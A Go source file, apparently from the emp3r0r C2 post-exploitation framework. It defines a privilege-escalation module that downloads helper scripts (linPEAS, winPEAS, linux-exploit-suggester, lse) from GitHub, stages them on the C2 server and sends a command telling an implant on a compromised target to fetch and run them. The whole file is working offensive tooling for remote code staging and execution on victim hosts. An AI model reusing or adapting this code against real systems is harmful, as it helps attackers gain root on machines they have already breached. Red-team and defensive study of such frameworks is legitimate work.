package modules

import (
	"fmt"
	"sync"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/tools"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// LPEHelperURLs scripts that help you get root
var LPEHelperURLs sync.Map // map[string]string

func init() {
	LPEHelperURLs.Store("lpe_les", "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh")
	LPEHelperURLs.Store("lpe_lse", "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh")
	LPEHelperURLs.Store("lpe_linpeas", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh")
	LPEHelperURLs.Store("lpe_winpeas.ps1", "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1")
	LPEHelperURLs.Store("lpe_winpeas.bat", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat")
	LPEHelperURLs.Store("lpe_winpeas.exe", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe")
}

func moduleLPE(ctx *c2context.C2Context) {
	go func() {
		// target
		target := ctx.Target
		if target == nil {
			logging.Errorf("Target not exist")
			return
		}
		helperOpt, ok := ctx.Flags["lpe_helper"]
		if !ok {
			logging.Errorf("Option 'lpe_helper' not found")
			return
		}
		helperName := helperOpt

		// download third-party LPE helper
		logging.Infof("Updating local LPE helper...")
		url, ok := LPEHelperURLs.Load(helperName)
		if !ok {
			logging.Errorf("LPE helper %s not found", helperName)
			return
		}
		err := tools.DownloadFile(url.(string), live.Temp+transport.WWW+helperName)
		if err != nil {
			logging.Errorf("Failed to download %s: %v", helperName, err)
			return
		}

		// exec
		logging.Infof("This can take some time, please be patient")
		cmd := fmt.Sprintf("%s --script_name %s", def.C2CmdLPE, helperName)
		logging.Infof("Running %s", cmd)
		err = CmdSender(cmd, "", target.Tag)
		if err != nil {
			logging.Errorf("Run %s: %v", cmd, err)
		}
	}()
}
